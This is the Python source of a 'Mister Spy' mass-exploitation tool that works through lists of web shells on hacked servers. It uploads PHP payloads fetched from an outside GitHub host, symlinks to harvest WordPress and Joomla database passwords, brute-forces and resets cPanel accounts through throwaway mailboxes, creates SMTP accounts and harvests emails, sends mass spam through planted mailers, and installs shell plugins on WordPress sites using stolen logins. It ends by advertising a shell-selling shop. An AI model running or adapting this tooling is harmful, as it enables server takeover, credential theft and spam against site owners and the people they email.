import concurrent.futures
import smtplib
from time import strftime
from time import time as timer

import random
import re
import requests
import string
import time
from colorama import *
import os

init(autoreset=True)

fr = Fore.RED
fc = Fore.CYAN
fw = Fore.WHITE
fg = Fore.GREEN
fm = Fore.MAGENTA
fy = Fore.YELLOW
# MrSpy

headers = {'Connection': 'keep-alive',
           'Cache-Control': 'max-age=0',
           'Upgrade-Insecure-Requests': '1',
           'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
           'Accept-Encoding': 'gzip, deflate',
           'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8'}


def checkupdate():
    try:
        check = requests.get("http://www.moetazbrayek.com/update.txt", timeout=7).content
        if "update By Mister Spy" in str(check):
            print("update avaible go to downlaod => http://moetazbrayek.com/update.py")
            time.sleep(20)
    except:
        pass

def ran(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))


def file_get_contents(filename):
    with open(filename) as f:
        return f.read()


def upload(shell, file):
    global path
    try:
        filename = ran(10) + '.php'
        s1 = shell
        while '/' in s1:
            s1 = s1[s1.index("/") + len("/"):]
        path = shell.replace(s1, filename)
        filedata = {'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'UTF-8'}
        fileup = {'f': (filename, file)}
        upFile = requests.post(shell, data=filedata, files=fileup, headers=headers, timeout=20)
        return path
    except:
        print(fr+'[-] Uploading Failed ! ' + shell +fw)


def uploadfile(shell, fileSrc):
    try:
        shell = shell.replace('\n', '').replace('\r', '')
        checklive = requests.get(shell).content
        if 'Uname:' in checklive:
            print (fy+'(*) Shell Working Uploading ...'+fw)
            upload(shell, fileSrc)
            print (fg+'[+] Done -> ' + path+fw)
        else:
            print (fr+'[-] Shell Dead ' + shell+fw)
    except:
        pass


def symlink(shell):
    try:
        shell = shell.replace('\n', '').replace('\r', '')
        # check if vhosts or not
        check = requests.get(shell, timeout=7)
        if '/vhosts/' in str(check.content):
            file = requests.get('https://raw.githubusercontent.com/MoetazBrayek/Python/master/vhosts.php').content
            upload(shell, file)
            requests.get(path)
            st = path[:-14]
            vhos = st + "/SpyVhots/spyvhost.cin"
            requests.get(vhos)
            vhoss = st + "/SpyVhots/"
            homereqq = requests.get(vhos)
            if '.txt' in str(homereqq.content) and (' 0k' not in str(homereqq.content)):
                open("count.txt", "w").write(str(homereqq.content))
                with open("count.txt") as f:
                    contents = f.read()
                    count = contents.count(".txt")
                    final = count / 2
                    print (fg+'[+] '+str(final) + " Configs Found in The Server " + vhoss)
                    open("V2/Symlinked.txt", "a").write(str(final) + " " + vhoss)
            else:
                print ('[-] Config Not Found  -- > ' + vhoss)
        elif '/home/' or '/home2/' or 'public_html' in str(check.content):
            file = requests.get('https://raw.githubusercontent.com/MoetazBrayek/Python/master/config.php').content
            upload(shell, file)
            requests.get(path)
            st = path[:-14]
            home = st + "/home/"
            homereq = requests.get(home)
            if ('.txt' in str(homereq.content)) and (' 0k' not in  str(homereq.content)):
                open("count.txt", "w").write( str(homereq.content))
                with open("count.txt") as f:
                    contents = f.read()
                    count = contents.count(".txt")
                    final = count / 2
                    print (fg+'[+] '+str(final) + " Configs Found in The Server " + home+fw)
                    open("V2/Symlinked.txt", "a").write(str(final) + " " + home)
            else:
                print (fy+'[-] Config Not Found  -- > ' + home +fw)
        else:
            print (fr+'[-] No Config Found ' + shell+fw)
    except:
        pass


def uploadmailer(shell):
    try:
        shell = shell.replace('\n', '').replace('\r', '')
        file = requests.get('https://raw.githubusercontent.com/MoetazBrayek/Python/master/leaf.php').content
        upload(shell, file)
        leaf = requests.get(path).content
        # let's check if found mailer
        if 'Leaf PHPMailer' in str(leaf):
            print (fg+'[+] Mailer Upload Successfully -> ' + path+fw)
            open("V2/LeafMailer.txt", "a").write(path+'\n')
        else:
            print (fr+'Failed To Upload --> ' + shell+fw)
    except:
        pass


def creatsmtp(shell):
    try:
        shell = shell.replace('\n', '').replace('\r', '')
        checklive = requests.get(shell).content
        if 'Uname:' in str(checklive):
            print ('(*) Trying To Create Smtp ' + shell)
            file = requests.get('https://raw.githubusercontent.com/MoetazBrayek/Python/master/smtp.php').content
            upload(shell, file)
            a = requests.get(path).content
            smtpC = re.findall(re.compile('<smtp>(.*)</smtp>'),str(a))[0]
            if 'spyv2' and '|' in smtpC:
                print (fg+'[+] Created With Sucess -> ' + smtpC +fw)
                open("V2/Smtps.txt", "a").write(smtpC + '\n')
            else:
                print (fr+'(-) No Smtp Found' +fw)
        else:
            print (fr+'[-] Shell Dead ' + shell+fw)
    except:
        pass


def grabbMail(shell):
    try:
        shell = shell.replace('\n', '').replace('\r', '')
        file = requests.get('https://raw.githubusercontent.com/MoetazBrayek/Python/master/mail.php').content
        upload(shell, file)
        emil = requests.get(path).content
        if 'Mailst By D3F4ULT' in str(emil):
            st = path[:-14]
            rz = st + "/list.txt"
            result = requests.get(rz, allow_redirects=False, timeout=7).content
            if '@' in str(result):
                open("count2.txt", "w").write(str(result))
                open("V2/emails.", "a").write(str(result) + '\n')
                with open("count2.txt") as f:
                    contents = f.read()
                    count = contents.count("@")
                print ('[+] Found ' + str(count) + ' Emails -> ' + shell)
                print (result)
            else:
                print (fy+'[-] No Email Found ' + path+fw)
        else:
            print (fr+'[-] Shells Not Working ' + shell+fw)
    except:
        pass


def acceshas(shell):
    try:
        shell = shell.replace('\n', '').replace('\r', '')
        file = requests.get('https://raw.githubusercontent.com/MoetazBrayek/Python/master/acceshash.php').content
        upload(shell, file)
        data = {'go': 'Check'}
        taz = requests.post(path, data=data)
        smtpC = re.findall(re.compile(
            'Total Hash Found =(.*)<br>'),
            str(taz.content))[0]
        if int(smtpC) > 0:
            print (fg+'[+] Found ' + path+fw)
            open("V2/AccesHash.txt", "a").write(path+'\n')
        else:
            print (fy+'[-] No AccessHash ' + shell+fw)
    except:
        pass


def checkshell(shell):
    try:
        shell = shell.replace('\n', '').replace('\r', '')
        checkshell = requests.get(shell).content
        if 'Uname:' in str(checkshell):
            print (fg+'[+] Shell Work ' + shell +fw)
        else:
            print (fr+'[-] Dead ' + shell +fw)
    except:
        pass


def changemail():
    session = requests.session()
    payload = {"f": "get_email_address"}
    r = session.get("http://api.guerrillamail.com/ajax.php", params=payload)
    email = r.json()["email_addr"]
    return email, session.cookies


def checkinbox(cookies, user):
    # try:
    kk = 'fuck'
    cookies = {"PHPSESSID": cookies}
    session = requests.session()
    payload = {"f": "set_email_user", "email_user": user, "lang": "en"}
    r = session.get("http://api.guerrillamail.com/ajax.php", params=payload, cookies=cookies)
    payload = {"f": "check_email", "seq": "1"}
    r = session.get("http://api.guerrillamail.com/ajax.php", params=payload, cookies=cookies)
    for email in r.json()["list"]:
        if 'cpanel' in email["mail_from"]:
            email_id = email["mail_id"]
            payload = {"f": "fetch_email", "email_id": email_id}
            r = session.get("http://api.guerrillamail.com/ajax.php", params=payload, cookies=cookies)
            kk = r.json()['mail_body'].split(
                '<p style="border:1px solid;margin:8px;padding:4px;font-size:16px;width:250px;font-weight:bold;">')[
                1].split('</p>')[0]
            payload = {"f": "del_email", "email_ids[]": int(email_id)}
            r = session.get("http://api.guerrillamail.com/ajax.php", params=payload, cookies=cookies)
        else:
            kk = 'fuck'
    return kk


def resetPassword(shell):
    try:
        # Remember To Creat Function To Check What Protocol Using Site ,
        shell = shell.replace('\n', '').replace('\r', '')
        checkiflive = requests.get(shell).content
        if 'Uname:' in str(checkiflive):
            print ('(*) Shell Is Working ..\n |__>' + shell)
            urr = shell.split('/')
            cpanel1 = 'http://' + urr[2] + ':2082'
            cpanel2 = 'https://' + urr[2] + ':2083'
            cp1 = requests.get(cpanel1, timeout=15).content
            cp2 = requests.get(cpanel2, timeout=15).content
            if ('Reset Password' in str(cp1)) or ('Reset Password' in str(cp2)):
                print (fy+'[+] Reset Password Avaible In ' + shell+fy)
                file = requests.get('https://raw.githubusercontent.com/MoetazBrayek/Python/master/reset.php').content
                upload(shell, file)
                src = str(changemail())
                email = re.findall(re.compile('u\'(.*)\', <RequestsCookieJar'), src)[0]
                cookies = re.findall(re.compile('name=\'PHPSESSID\', value=\'(.*)\', port='), src)[0]
                post1 = {'email': email, 'get': 'get'}
                requests.post(path, data=post1, headers=headers,timeout=15)
                time.sleep(10)
                code = checkinbox(cookies, email)
                start = timer()
                while ((code == 'fuck') and ((timer() - start) < 90)):
                    time.sleep(5)
                    code = checkinbox(cookies, email)
                if (code == 'fuck'):
                    print (fr+' [-] Mail Not Recived Try Manulle '+fw)
                    open("V2/RestedCpsFailed.txt", "a").write(path + '\n')
                    pass
                else:
                    print (fg+'(*)Your Code Is : ' +fm+ code+fy)
                    post2 = {'code': code, 'get2': 'get2'}
                    check2 = requests.post(path, data=post2, headers=headers,
                                           timeout=15).content
                    if '<cpanel>' in check2:
                        cpanelRt = re.findall(re.compile('<cpanel>(.*)</cpanel>'), check2)[0]
                        print (fg+'[+] Succeeded => ' + cpanelRt+fw)
                        open("V2/RestedCps.txt", "a").write(cpanelRt + '\n')
                    else:
                        print (fr+'|_> Reset Password Failed '+fw)
            else:
                print ('[-] Reset Not available ... ' + shell)

        else:
            print (fr+'[-] Shell Not Live ... ' + shell+fw)
    except:
        pass


def checkmail(shell):
    try:
        getSession = requests.session()
        sessionMail = getSession.get("https://tempmail.net")
        workMail = re.findall('class="adres-input" value="(.*?)" readonly>', sessionMail.content)
        workMail = workMail[0]

        file = """
                           <?php
                                   if(function_exists("mail")) {
                                           mail('""" + workMail + """', 'SpyV2', 'Mail Working!');
                                           echo 'sent!';
                                   } else {
                                           echo 'MailFunctionNotWork';
                                   }
                           ?>
                   """
        shell = shell.replace('\n', '').replace('\r', '')
        upload(shell, file)
        get = requests.get(path).content
        if "sent!" in str(get):
            print ("[+] " + shell + " ==> Mail Sent Let Me Check Deliver")
            maincodeurl = None
            count = 0
            while maincodeurl is None:
                getcodeurl = getSession.get("https://tempmail.net")
                sexy = re.findall('<li class="mail " id="mail_(.*?)">', getcodeurl.content)
                if sexy:
                    maincodeurl = sexy
                count += 1
                if count > 100:
                    maincodeurl = []
            if maincodeurl == []:
                print (fr+"[-] " + shell + " ==> Mail doesn't works or too late "+fw)
            else:
                print (fg+"[+] " + shell + " ==> Mail Recived "+fw)
                open('mail_works.txt', 'a').write(shell + "\n")
        else:
            print (fm+"[-] " + shell + " ==> Mail function Disabled"+fy)


    except:
        pass


####################### cp brute shells #################

def grab_users(path):
    cookies = {
        'OCSESSID': 'bd7f42c6f29b3885ee2746f72d',
        'language': 'en-gb',
        'currency': 'USD',
        'timezone': 'Africa/Lagos',
        'PHPSESSID': 't71r8l1hseq3o16f1c8bbgf2r2',
    }

    data = {
        'usre': 'Get Usernames & Config !'
    }

    r = requests.post(path, headers=headers, cookies=cookies, data=data).text
    return r.split('<textarea rows=10 cols=30 name=user>')[1].split('</textarea><br><br>')[0]


def crack_cp(path, users, passwds):
    url = path.split('/')
    cp = 'http://' + url[2] + '/cpanel|'
    cookies = {
        'OCSESSID': 'bd7f42c6f29b3885ee2746f72d',
        'language': 'en-gb',
        'currency': 'USD',
        'timezone': 'Africa/Lagos',
        'PHPSESSID': 't71r8l1hseq3o16f1c8bbgf2r2',
    }

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Origin': 'http://toys.lavjen.com',
        'Upgrade-Insecure-Requests': '1',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Referer': path,
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9',
    }

    data = {
        'page': 'find',
        'usernames': users,
        'passwords': passwds,
        'type': 'simple'
    }

    r = requests.post(path, headers=headers, cookies=cookies, data=data)
    cps = r.text.split('You Found <font color=green>')[1].split('</font>')[0]
    print (fg+'[+] You Found ' + cps + ' Cpanles '+fr)
    cpanles = re.findall(re.compile('<cpanel>(.*)</cpanel><br />'), str(r.content))[0]
    open('V2/crackcp.txt', 'a').write(cp + cpanles + '\n')


def cprbuteforce(shell):
    try:
        shell = shell.replace('\n', '').replace('\r', '')
        checkifshellhomepath = requests.get(shell, timeout=7).content
        if ('/home/' or '/home2/' or '/public_html/' in str(checkifshellhomepath)) and ('Uname:' in str(checkifshellhomepath)):
            print ('|_> Shell Is Working  ....  ' + shell)
            # Config First
            file = requests.get('https://raw.githubusercontent.com/MoetazBrayek/Python/master/config.php', timeout=7).content
            upload(shell, file)
            check2 = requests.get(path, timeout=7)
            st = path[:-14]
            home = st + "/home/"
            homereq = requests.get(home, timeout=7)
            if '.txt' in str(homereq.content) and (' 0k' not in str(homereq.content)):
                print (fg+'[+] Symlinked Done ' + path+fw)
                file = requests.get('https://raw.githubusercontent.com/MoetazBrayek/Python/master/spybruter.php', timeout=7).content
                upload(shell, file)
                get = requests.get(path).content
                if 'MisterSpyV2Bruter' in str(get):
                    print (fy+'(*)lets Grabb Users ..|_*'+fw)
                    users = grab_users(path)
                    print (users)
                    cName = re.findall('<a href="(.*?)">',str(homereq.content) )
                    configs = []
                    for i in cName:
                        configs.append(home + '/' + i)
                    passw = ""
                    print (fy+'(*) Lets Grabb Password .....'+fw)
                    for i in configs:
                        if 'WORDPRESS' in i:
                            r = requests.get(i)
                            uu = re.findall("define\('DB_PASSWORD', '(.*?)'\);", r.content)
                            aa = ''.join(uu)
                            passw += aa + '\r\n'
                            print (uu)
                        elif 'JOOMLA' in i:
                            r = requests.get(i)
                            uu = re.findall("public \$password = '(.*?)';", r.content)
                            zz = ''.join(uu)
                            passw += zz + '\r\n'
                            print (uu)
                    print (fm+'(*)Now Lets Crack ....|_>'+fw)
                    crack_cp(path, users, passw)
                else:
                    print (fr+'[-] Upload Failed ' + shell+fw)

            else:
                print (fy+'|_> No Config In ' + shell+fw)

        else:
            print ('(-) Symlink Not Available '+shell)

    except:
        pass


def wpmass(shell):
    try:
        shell = shell.replace('\n', '').replace('\r', '')
        checkifshellhomepath = requests.get(shell, timeout=7).content
        if ('/home/' or '/home2/' or '/public_html/' in str(checkifshellhomepath)) and ('Uname:' in str(checkifshellhomepath)):
            file = requests.get('https://raw.githubusercontent.com/MoetazBrayek/Python/master/wpmass.php').content
            upload(shell, file)
            get = requests.get(path, timeout=7).content
            if 'spyv2@12' in str(get):
                count = 0
                urls = get.split("<br>")
                for link in urls:
                    if link != "":
                        count += 1
                        print (link)
                    else:
                        print ('')
                print (fg+"[+] " + shell + " ==> Total Wordpress --> " + str(count) + ":D"+fw)
            else:
                print ('[-] No Wordpress Avaible ' + shell)
        else:
            print (fr+'[-] Unknow Type of Shell ' + shell+fw)

    except:
        pass


def massupwp(url):
    try:

        lib = requests.session()
        site, user, passwd = url.split("|")
        get = lib.get(site, timeout=10)
        submit = re.findall('<input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="(.*)" />',str(get.content))
        submit = submit[0]
        redirect = re.findall('<input type="hidden" name="redirect_to" value="(.*?)" />', str(get.content))
        redirect = redirect[0]
        Login = {'log': user,
                 'pwd': passwd,
                 'wp-submit': submit,
                 'redirect_to': redirect,
                 'testcookie': '1'}
        req = lib.post(site, data=Login, timeout=20)
        currurl = site.replace("/wp-login.php", "")
        if 'dashboard' in str(req.content):

            print ('Login Succes Lets Upload Shell ...' + site)
            req = lib.post(site, data=Login, timeout=20)
            new3 = currurl + "/wp-admin/plugin-install.php?tab=upload"
            getdata = lib.get(new3, timeout=20, allow_redirects=False).content
            if '_wpnonce' and 'install-plugin-submit' in str(getdata):
                wponce = re.findall('id="_wpnonce" name="_wpnonce" value="(.*?)"', str(getdata))
                valueplugin = re.findall('id="install-plugin-submit" class="button" value="(.*?)"', str(getdata))
                zip = "ubb.zip"
                Data = {
                    '_wpnonce': wponce[0],
                    '_wp_http_referer': currurl + '/wp-admin/plugin-install.php?tab=upload',
                    'install-plugin-submit': valueplugin[0]
                }
                Data2 = {'pluginzip': (zip, open(zip, 'rb'), 'multipart/form-data')}
                lib.post(currurl + '/wp-admin/update.php?action=upload-plugin', data=Data, files=Data2, timeout=15)
                lib.post(currurl + '/wp-admin/update.php?action=upload-plugin', files=Data2, timeout=15)
                shell = lib.get(currurl + '/wp-content/plugins/ubb/up.php', timeout=7)
                if "upload" in str(shell.content):
                    print (fg+"[+] " + currurl + '/wp-content/plugins/ubb/index.php' + " ==> Upload Success!"+fw)
                    open('done_shell.txt', 'a').write(currurl + '/wp-content/plugins/ubb/index.php' + '\n')
                else:
                    print (fy+"[-] " + currurl + " ==> Upload somehow failed! Maybe firewall?"+fw)
            else:
                print (fr+'Problem In Upload Page Not Loading ' + new3+fw)
        else:
            print (fy+"[-] " + currurl + " ==> Login failed or website down!"+fw)
    except:
        pass


###############################################################################
# other tools
def spymailer(site, subject, fromname, data, mailer):
    try:
        site = site.replace('\n', '').replace('\r', '')
        post_data = {'to': site, 'subject': subject, 'fromname': fromname, 'message': data}
        r = requests.post(mailer, data=post_data)
        print ('--------------------------')
        print ('To ===> ' + site)
        print ('Subject ===> ' + subject)
        print ('Name ===> ' + fromname)
        print ('Mailer ===> ' + mailer)
        print ('Status ===> {}Sent'.format(fg, fw))
        print ('--------------------------')
    except:
        pass





def masssmtpchecker(url, address):
    ur = url.rstrip()
    ch = ur.split('\n')[0].split('|')
    serveraddr = ch[0]
    toaddr = address
    fromaddr = ch[2]
    serverport = ch[1]
    SMTP_USER = ch[2]
    SMTP_PASS = ch[3]
    now = strftime("%Y-%m-%d %H:%M:%S")
    msg = "From: %s\r\nTo: %s\r\nSubject: Test Message from smtptest at %s\r\n\r\nTest message from the smtptest tool sent at %s" % (
        fromaddr, toaddr, now, now)
    server = smtplib.SMTP()
    try:
        server.connect(serveraddr, serverport)
        server.ehlo()
        server.starttls()
        server.login(SMTP_USER, SMTP_PASS)
        server.sendmail(fromaddr, toaddr, msg)
        print (fg+"(*) Working ===> " + ur+fw)
        open('V2/ValidSmtp.txt', 'a').write(url + "\n")
        server.quit()
    except:
        print (fr+"[-] FAILED ===> " + ur+fw)
        pass


################################################################################
# cp tools
def cpcheck(url):
    try:
        domain, username, pwd = url.split("|")
        lib = requests.Session()
        host = domain + "/login/?login_only=1"
        log = {'user': username, 'pass': pwd}
        req = lib.post(host, data=log, timeout=5)
        if 'security_token' in str(req.content):
            print("[+] " + domain + " ==> Login Successful!")
            open('cp_loginok.txt', 'a').write(url + "\n")
        else:
            print("[-] " + domain + " ==> Login Invalid!")
    except:
        pass


def cpfileupload(url, filename):
    ur = url.rstrip()
    site = ur.split('|')[0]
    user = ur.split('|')[1]
    passw = ur.split('|')[2]
    try:
        cookies = {
            'timezone': 'Africa/Lagos',
        }

        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36',
            'Content-type': 'application/x-www-form-urlencoded',
            'Accept': '*/*',
            'Connection': 'keep-alive',
        }

        params = (
            ('login_only', '1'),
        )

        data = {
            'user': user,
            'pass': passw,
            'goto_uri': '/'
        }

        s = requests.session()
        r = s.post(site + '/login/', headers=headers, params=params, data=data)
        sec = r.json()['security_token']
        r1 = s.get(site + sec + '/execute/Resellers/list_accounts', headers=headers, cookies=s.cookies, timeout=10)
        k = r1.json()['data']
        for kk in k:
            dom = kk['domain']
        ur = site + sec + "/json-api/cpanel"
        file = {
            'file-0': open(filename, 'rb'),
        }
        requests.post(url=ur,data={'cpanel_jsonapi_module': 'Fileman', 'cpanel_jsonapi_func': 'uploadfiles',
            'cpanel_jsonapi_apiversion': '2', 'getdiskinfo': '1', 'permissions': '0644', 'cpanel-trackupload': '',
                  'dir': '/home/' + user + '/public_html', 'overwrite:': '0'}
            , files=file, headers=headers, cookies=s.cookies, timeout=10)
        requests.post(url=ur, data={'cpanel_jsonapi_module': 'Fileman', 'cpanel_jsonapi_func': 'uploadfiles',
                                    'cpanel_jsonapi_apiversion': '2', 'getdiskinfo': '1', 'permissions': '0644',
                                    'cpanel-trackupload': '',
                                    'dir': '/home2/' + user + '/public_html', 'overwrite:': '0'}
                      , files=file, headers=headers, cookies=s.cookies, timeout=10)
        cpups = 'http://' + dom + '/' + filename
        open('V2/uploadedfromcp.txt', 'a').write('http://' + dom + '/' + filename + "\n")
        print( cpups + '{} [+]{}Success '.format(fg, fw))
    except:
        print (url + '{} [+]{}Failed '.format(fr, fw))
        pass


#################################################################################
def scan(function, sites):
    try:
        with concurrent.futures.ThreadPoolExecutor(50) as executor:
            executor.map(function, sites)
    except Exception as e:
        print(e)
def main():
    try:
        os.mkdir('V2')
    except:
        pass
    Banner = """
                   `\-.   `
                      \ `.  `
                       \  \ |
              __.._    |   \.       S O N - G O K U
       ..---~~     ~ . |    Y
         ~-.          `|    |
            `.               `~~--.
              \                    ~.
               \                     \__. . -- -  .
         .-~~~~~      ,    ,            ~~~~~~---...._
      .-~___        ,'/  ,'/ ,'\          __...---~~~
            ~-.    /._\_( ,(/_. 7,-.    ~~---...__
           _...>-  P""6=`_/"6"~   6)    ___...--~~~
            ~~--._ \`--') `---'   9'  _..--~~~
                  ~\ ~~/_  ~~~   /`-.--~~
                    `.  ---    .'   \_
                      `. " _.-'     | ~-.,-------._
                  ..._../~~   ./       .-'    .-~~~-.
            ,--~~~ ,'...\` _./.----~~.'/    /'       `-
        _.-(      |\    `/~ _____..-' /    /      _.-~~`.
       /   |     /. ^---~~~~       ' /    /     ,'  ~.   
      (    /    (  .           _ ' /'    /    ,/      \   )
      (`. |     `\   - - - - ~   /'      (   /         .  |
       \.\|       \            /'        \  |`.           /
       /.'      `\         /'           ~-\         .  /
      /,   (        `\     /'                `.___..-      
     | |    \         `\_/'                  //      \.     |
     | |     |                 _Seal_      /' |       |     |
            Powered By Mister Spy
    """
    print (fy + Banner + fw)
    print ("{}[{}1{}] {}  Mass Symlink Shells                               ".format(fr, fg, fr, fw))
    print ("{}[{}2{}] {}  Mass Create Smtp From Shells                      ".format(fr, fg, fr, fw))
    print ("{}[{}3{}] {}  Mass Extract Emails From Shells                     ".format(fr, fg, fr, fw))
    print ("{}[{}4{}] {}  Mass Upload Mailers From Shells                   ".format(fr, fg, fr, fw))
    print ("{}[{}5{}] {}  Mass Check Working Shells                        ".format(fr, fg, fr, fw))
    print ("{}[{}6{}] {}  Mass Cp Rest From Shells                          ".format(fr, fg, fr, fw))
    print ("{}[{}7{}] {}  Mass Mail Check From Shells                     ".format(fr, fg, fr, fw))
    print ("{}[{}8{}] {}  Mass Find Access Hash From Shells                ".format(fr, fg, fr, fw))
    print ("{}[{}9{}] {}  Mass Find Cpanel  From Shells                    ".format(fr, fg, fr, fw))
    print ("{}[{}10{}] {} Mass File Upload From Shells [Random]            ".format(fr, fg, fr, fw))
    print ("{}[{}11{}] {} Mass Symlink & Brute Force Cpanel From Shells   ".format(fr, fg, fr, fw))
    print ("{}[{}12{}] {} Mass Wordpress Pass Change From Shells           ".format(fr, fg, fr, fw))
    print ("{}[{}13{}] {} Mass Shell Upload In Wordpress Panel             ".format(fr, fg, fr, fw))
    print ("{}[{}14{}] {} Shell Replacement  T-Shop/Olux/Xleet                ".format(fr, fg, fr, fw))
    print ("{}[{}15{}] {} Mass Cpanel Checker                              ".format(fr, fg, fr, fw))
    print ("{}[{}16{}] {} Mass Cpanel Upload File                          ".format(fr, fg, fr, fw))
    print ("{}[{}18{}] {} Mass Smtp Checker                                ".format(fr, fg, fr, fw))
    print ("{}[{}19{}] {} Mass Grab Sites ViewDns/HackTarget               ".format(fr, fg, fr, fw))
    print ("{}[{}20{}] {} Mass SpyMailer Sender                              ".format(fr, fg, fr, fw))
    print ("{}[{}21{}] {} Check Update                                     ".format(fr, fg, fr, fw))

    choice = input('\nEnter Ur Choice : ')

    if choice == '1':
        try:
            sites = open(input('Enter  List :'), 'r').read().splitlines()
            scan(symlink,sites)
        except:
            pass
    elif choice == '2':
        try:
            sites = open(input('Enter  List :'), 'r').read().splitlines()
            scan(creatsmtp, sites)
        except:
            pass
    elif choice == '3':
        try:
            sites = open(input('Enter  List :'), 'r').read().splitlines()
            scan(grabbMail, sites)
        except:
            pass
    elif choice == '4':
        try:
            sites = open(input('Enter  List :'), 'r').read().splitlines()
            scan(uploadmailer, sites)
        except:
            pass
    elif choice == '5':
        try:
            sites = open(input('Enter  List :'), 'r').read().splitlines()
            scan(checkshell, sites)
        except:
            pass
    elif choice == '6':
        try:
            sites = open(input('Enter  List :'), 'r').read().splitlines()
            scan(resetPassword, sites)
        except:
            pass
    elif choice == '7':
        try:
            sites = open(input('Enter  List :'), 'r').read().splitlines()
            scan(checkmail, sites)
        except:
            pass
    elif choice == '8':
        try:
            sites = open(input('Enter  List :'), 'r').read().splitlines()
            scan(creatsmtp, sites)
        except:
            pass
    elif choice == '9':
        try:
            sites = open(input('Enter  List :'), 'r').read().splitlines()
            scan(creatsmtp, sites)
        except:
            pass
    elif choice == '10':
        files = input('Enter Your File Name :')
        fileSrc = file_get_contents(files)
        try:
            sites = open(input('Enter  List :'), 'r').read().splitlines()
            uploadfile(fileSrc, sites)
        except:
            pass
    elif choice == '11':
        try:
            sites = open(input('Enter  List :'), 'r').read().splitlines()
            scan(cprbuteforce, sites)
        except:
            pass
    elif choice == '12':
        try:
            sites = open(input('Enter  List :'), 'r').read().splitlines()
            scan(wpmass, sites)
        except:
            pass
    elif choice == '13':
        try:
            sites = open(input('Enter  List :'), 'r').read().splitlines()
            scan(massupwp, sites)
        except:
            pass
    elif choice == '15':
        try:
            sites = open(input('Enter  List :'), 'r').read().splitlines()
            scan(cpcheck, sites)
        except:
            pass
    elif choice == '16':
        filename = input('Filename : ')
        liists = input('Enter Your List :')
        with open(liists) as f:
            for url in f:
                cpfileupload(url, filename)
    elif choice == '18':
        address = input('Enter Your email :')
        liists = input('Enter Your List :')
        with open(liists) as f:
            for url in f:
                masssmtpchecker(url, address)
    elif choice == '20':
        with open('letter.txt', 'r') as myfile:
            data = myfile.read()
        subject = input('Subject :')
        fromname = input('From :')
        zarwi = input('emails.txt :')
        with open(zarwi) as f:
            for site in f:
                filename = open('mailers.txt', 'r')
                mailer = random.choice(open('mailers.txt').readlines())
                mailer = mailer.replace('\n', '').replace('\r', '')
                filename.close()
                spymailer(site, subject, fromname, data, mailer)
    elif choice == '21':
        update = requests.get('https://raw.githubusercontent.com/MoetazBrayek/Python/master/update.php').content
        print( update)
    else:
        print ('Choice Wrong ... Run Again !')

if __name__ == '__main__':
    checkupdate()
    main()
    print ('Thank You For Using My Tool Join Us T-shop.to')
